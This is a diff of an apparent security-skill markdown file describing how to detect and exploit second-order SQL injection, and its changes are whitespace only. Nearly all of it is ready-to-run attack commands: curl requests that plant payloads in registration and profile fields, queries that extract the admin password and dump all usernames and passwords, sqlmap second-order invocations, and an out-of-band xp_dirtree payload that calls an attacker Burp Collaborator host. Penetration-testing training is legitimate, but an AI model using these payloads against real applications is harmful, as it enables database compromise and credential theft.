@@ -1,8 +1,8 @@
 ---
 name: performing-second-order-sql-injection
 description: Detect and exploit second-order SQL injection vulnerabilities where malicious
-  input is stored in a database and later executed in an unsafe SQL query during a
-  different application operation.
+ input is stored in a database and later executed in an unsafe SQL query during a
+ different application operation.
 domain: cybersecurity
 subdomain: web-application-security
 tags:
@@ -52,52 +52,52 @@ mitre_attack:
 ```bash
 # Map the application to identify:
 # 1. STORAGE POINTS: Where user input is saved to database
-#    - User registration (username, email, address)
-#    - Profile update forms
-#    - Comment/review submission
-#    - File upload metadata
-#    - Order/booking details
+# - User registration (username, email, address)
+# - Profile update forms
+# - Comment/review submission
+# - File upload metadata
+# - Order/booking details
 
 # 2. TRIGGER POINTS: Where stored data is used in queries
-#    - Admin panels displaying user data
-#    - Report generation
-#    - Search functionality using stored preferences
-#    - Password reset using stored email
-#    - Export/download features
+# - Admin panels displaying user data
+# - Report generation
+# - Search functionality using stored preferences
+# - Password reset using stored email
+# - Export/download features
 
 # Register a user with SQL injection in the username
 curl -X POST http://target.com/register \
-  -d "username=admin'--&password=test123&email=test@test.com"
+ -d "username=admin'--&password=test123&email=test@test.com"
 ```
 
 ### Step 2 — Inject Payloads via Storage Points
 ```bash
 # Store SQL injection payload in username during registration
 curl -X POST http://target.com/register \
-  -d "username=test' OR '1'='1'--&password=Test1234&email=test@test.com"
+ -d "username=test' OR '1'='1'--&password=Test1234&email=test@test.com"
 
 # Store injection in profile fields
 curl -X POST http://target.com/api/profile \
-  -H "Cookie: session=AUTH_TOKEN" \
-  -d "display_name=test' UNION SELECT password FROM users WHERE username='admin'--"
+ -H "Cookie: session=AUTH_TOKEN" \
+ -d "display_name=test' UNION SELECT password FROM users WHERE username='admin'--"
 
 # Store injection in address field
 curl -X POST http://target.com/api/address \
-  -H "Cookie: session=AUTH_TOKEN" \
-  -d "address=123 Main St' OR 1=1--&city=Test&zip=12345"
+ -H "Cookie: session=AUTH_TOKEN" \
+ -d "address=123 Main St' OR 1=1--&city=Test&zip=12345"
 
 # Store injection in comment/review
 curl -X POST http://target.com/api/review \
-  -H "Cookie: session=AUTH_TOKEN" \
-  -d "product_id=1&review=Great product' UNION SELECT table_name FROM information_schema.tables--"
+ -H "Cookie: session=AUTH_TOKEN" \
+ -d "product_id=1&review=Great product' UNION SELECT table_name FROM information_schema.tables--"
 ```
 
 ### Step 3 — Trigger Execution of Stored Payloads
 ```bash
 # Trigger via password change (uses stored username)
 curl -X POST http://target.com/change-password \
-  -H "Cookie: session=AUTH_TOKEN" \
-  -d "old_password=Test1234&new_password=NewPass123"
+ -H "Cookie: session=AUTH_TOKEN" \
+ -d "old_password=Test1234&new_password=NewPass123"
 
 # Trigger via admin user listing
 curl -H "Cookie: session=ADMIN_TOKEN" http://target.com/admin/users
@@ -117,17 +117,17 @@ curl -H "Cookie: session=ADMIN_TOKEN" "http://target.com/admin/reports?type=user
 # SQLMap with --second-url for second-order injection
 # Store payload at registration, trigger at profile page
 sqlmap -u "http://target.com/register" \
-  --data="username=*&password=test&email=test@test.com" \
-  --second-url="http://target.com/profile" \
-  --cookie="session=AUTH_TOKEN" \
-  --batch --dbs
+ --data="username=*&password=test&email=test@test.com" \
+ --second-url="http://target.com/profile" \
+ --cookie="session=AUTH_TOKEN" \
+ --batch --dbs
 
 # Use --second-req for complex trigger requests
 sqlmap -u "http://target.com/api/update-profile" \
-  --data="display_name=*" \
-  --second-req=trigger_request.txt \
-  --cookie="session=AUTH_TOKEN" \
-  --batch --tables
+ --data="display_name=*" \
+ --second-req=trigger_request.txt \
+ --cookie="session=AUTH_TOKEN" \
+ --batch --tables
 
 # Content of trigger_request.txt:
 # GET /admin/users HTTP/1.1
@@ -140,8 +140,8 @@ sqlmap -u "http://target.com/api/update-profile" \
 # Boolean-based blind: Check if stored payload causes different behavior
 # Store: test' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
 curl -X POST http://target.com/api/profile \
-  -H "Cookie: session=AUTH_TOKEN" \
-  -d "display_name=test' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--"
+ -H "Cookie: session=AUTH_TOKEN" \
+ -d "display_name=test' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--"
 
 # Trigger and observe response difference
 curl -H "Cookie: session=AUTH_TOKEN" http://target.com/profile
@@ -149,14 +149,14 @@ curl -H "Cookie: session=AUTH_TOKEN" http://target.com/profile
 # Time-based blind second-order
 # Store: test'; WAITFOR DELAY '0:0:5'--
 curl -X POST http://target.com/api/profile \
-  -H "Cookie: session=AUTH_TOKEN" \
-  -d "display_name=test'; WAITFOR DELAY '0:0:5'--"
+ -H "Cookie: session=AUTH_TOKEN" \
+ -d "display_name=test'; WAITFOR DELAY '0:0:5'--"
 
 # Out-of-band extraction via DNS
 # Store: test'; EXEC xp_dirtree '\\attacker.burpcollaborator.net\share'--
 curl -X POST http://target.com/api/profile \
-  -H "Cookie: session=AUTH_TOKEN" \
-  -d "display_name=test'; EXEC master..xp_dirtree '\\\\attacker.burpcollaborator.net\\share'--"
+ -H "Cookie: session=AUTH_TOKEN" \
+ -d "display_name=test'; EXEC master..xp_dirtree '\\\\attacker.burpcollaborator.net\\share'--"
 ```
 
 ### Step 6 — Escalate to Full Database Compromise
@@ -164,11 +164,11 @@ curl -X POST http://target.com/api/profile \
 # Once injection is confirmed, enumerate database
 # Store UNION-based payload
 curl -X POST http://target.com/api/profile \
-  -d "display_name=test' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()--"
+ -d "display_name=test' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()--"
 
 # Extract credentials
 curl -X POST http://target.com/api/profile \
-  -d "display_name=test' UNION SELECT GROUP_CONCAT(username,0x3a,password) FROM users--"
+ -d "display_name=test' UNION SELECT GROUP_CONCAT(username,0x3a,password) FROM users--"
 
 # Trigger execution and read results
 curl http://target.com/profile
